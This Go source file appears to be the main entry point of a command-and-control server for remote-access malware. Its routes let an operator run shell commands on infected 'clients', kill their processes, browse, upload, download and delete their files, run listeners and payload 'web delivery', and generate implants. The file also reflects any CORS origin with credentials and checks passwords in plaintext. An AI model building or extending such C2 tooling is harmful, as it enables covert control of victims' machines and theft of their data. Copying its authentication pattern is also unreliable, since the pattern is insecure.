package main

import (
	"BackendTemplate/pkg/api"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/utils"
	"embed"
	"encoding/base64"
	"flag"
	"fmt"
	"html/template"
	"io/fs"
	"net/http"
	"os"
	"strconv"
	"strings"

	"github.com/gin-gonic/gin"
)

//go:embed dist
var embedFS embed.FS

func main() {
	utils.InitFunction()
	gin.SetMode(gin.ReleaseMode)
	var bindPort = flag.Int("p", 8089, "Specify alternate port")
	flag.Parse()
	if *bindPort > 65535 || *bindPort < 0 {
		flag.Usage()
		os.Exit(0)
	}
	database.ConnectDateBase()
	defer database.Engine.Close()

	database.Engine.Update(&database.Listener{Status: 2})
	database.Engine.Update(&database.WebDelivery{Status: 2})

	r := gin.New()
	// 配置 CORS
	r.Use(Cors())

	// 创建嵌入文件系统
	distFS, _ := fs.Sub(embedFS, "dist")
	staticFs, _ := fs.Sub(distFS, "static")
	// 提供静态文件，文件夹是 ./static
	r.StaticFS("/static/", http.FS(staticFs))

	// 引入html
	r.SetHTMLTemplate(template.Must(template.New("").ParseFS(embedFS, "dist/*.html")))

	// 处理未匹配的路由
	r.NoRoute(func(c *gin.Context) {
		c.HTML(http.StatusOK, "index.html", nil)
	})
	r.Use(authMiddleware())
	a := r.Group("/api")
	{
		// 登录
		a.POST("/users/login", api.LoginHandler)
	}

	// 使用 JWT 中间件保护以下路由
	protected := r.Group("/api")
	protected.Use(api.AuthMiddleware())

	// 注销
	protected.POST("/users/logout", api.LogoutHandler)

	// 修改密码
	protected.POST("/users/user_setting/ChangePassword", api.ChangePasswordHandler)

	protected.GET("/client/clientslist", api.GetClients)
	protected.POST("/client/shell/sendcommand", api.SendCommands)
	protected.GET("/client/shell/getshellcontent", api.GetShellContent)
	protected.GET("/client/pid", api.GetPidList)
	protected.POST("/client/pid/kill", api.KillPid)
	protected.POST("/client/file/tree", api.FileBrowse)
	protected.POST("/client/file/delete", api.FileDelete)
	protected.POST("/client/file/mkdir", api.MakeDir)
	protected.POST("/client/file/upload", api.FileUpload)
	protected.GET("/client/note/get", api.GetNote)
	protected.POST("/client/note/save", api.SaveNote)
	protected.POST("/client/file/download", api.DownloadFile)
	protected.GET("/client/downloads/info", api.GetDownloadsInfo)
	protected.POST("/client/downloads/downloaded_file", api.DownloadDownloadedFile)
	protected.GET("/client/file/drives", api.ListDrives)
	protected.POST("/client/file/filecontent", api.FetchFileContent)
	protected.GET("/client/exit", api.ExitClient)
	protected.POST("/client/addnote", api.AddUidNote)
	protected.POST("/client/sleep", api.EditSleep)
	protected.POST("/client/color", api.EditColor)
	protected.POST("/client/GenServer", api.GenServer)
	protected.GET("/client/listener/list", api.ShowListener)

	protected.POST("/listener/add", api.AddListener)
	protected.GET("/listener/list", api.ListListener)
	protected.POST("/listener/open", api.OpenListener)
	protected.POST("/listener/close", api.CloseListener)
	protected.POST("/listener/delete", api.DeleteListener)

	protected.GET("/webdelivery/list", api.ListWebDelivery)
	protected.POST("/webdelivery/start", api.StartWebDelivery)
	protected.POST("/webdelivery/close", api.CloseWebDelivery)
	protected.POST("/webdelivery/open", api.OpenWebDelivery)
	protected.POST("/webdelivery/delete", api.DeleteWebDelivery)

	fmt.Println("Listening on port ", *bindPort)
	r.Run("0.0.0.0:" + strconv.Itoa(*bindPort)) // 启动服务
}
func Cors() gin.HandlerFunc {
	return func(c *gin.Context) {
		method := c.Request.Method
		origin := c.Request.Header.Get("Origin")
		if origin != "" {
			c.Header("Access-Control-Allow-Origin", origin) // 可将将 * 替换为指定的域名
			c.Header("Access-Control-Allow-Methods", "POST, GET, OPTIONS, PUT, DELETE, UPDATE")
			c.Header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization")
			c.Header("Access-Control-Expose-Headers", "Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Cache-Control, Content-Language, Content-Type")
			c.Header("Access-Control-Allow-Credentials", "true")
		}
		if method == "OPTIONS" {
			c.AbortWithStatus(http.StatusNoContent)
		}
		c.Next()
	}
}
func authMiddleware() gin.HandlerFunc {

	return func(c *gin.Context) {
		authHeader := c.Request.Header.Get("Authorization")

		if authHeader == "" || !strings.HasPrefix(authHeader, "Basic ") {
			// 返回WWW-Authenticate头，触发浏览器的弹框
			c.Header("WWW-Authenticate", `Basic realm="Restricted"`)
			c.AbortWithStatus(401)
			return
		}

		encodedCreds := authHeader[len("Basic "):]
		creds, err := base64.StdEncoding.DecodeString(encodedCreds)
		if err != nil {
			c.Header("WWW-Authenticate", `Basic realm="Restricted"`)
			c.AbortWithStatus(401)
			return
		}

		credParts := strings.SplitN(string(creds), ":", 2)
		if len(credParts) != 2 {
			c.Header("WWW-Authenticate", `Basic realm="Restricted"`)
			c.AbortWithStatus(401)
			return
		}
		user, pass := credParts[0], credParts[1]

		var user_pass database.Users
		database.Engine.Where("username = ?", user).Get(&user_pass)
		if user_pass.Password != pass || user_pass.Password == "" {
			c.Header("WWW-Authenticate", `Basic realm="Restricted"`)
			c.AbortWithStatus(401)
			return
		}

		c.Set("user", user)
		c.Next()
	}
}
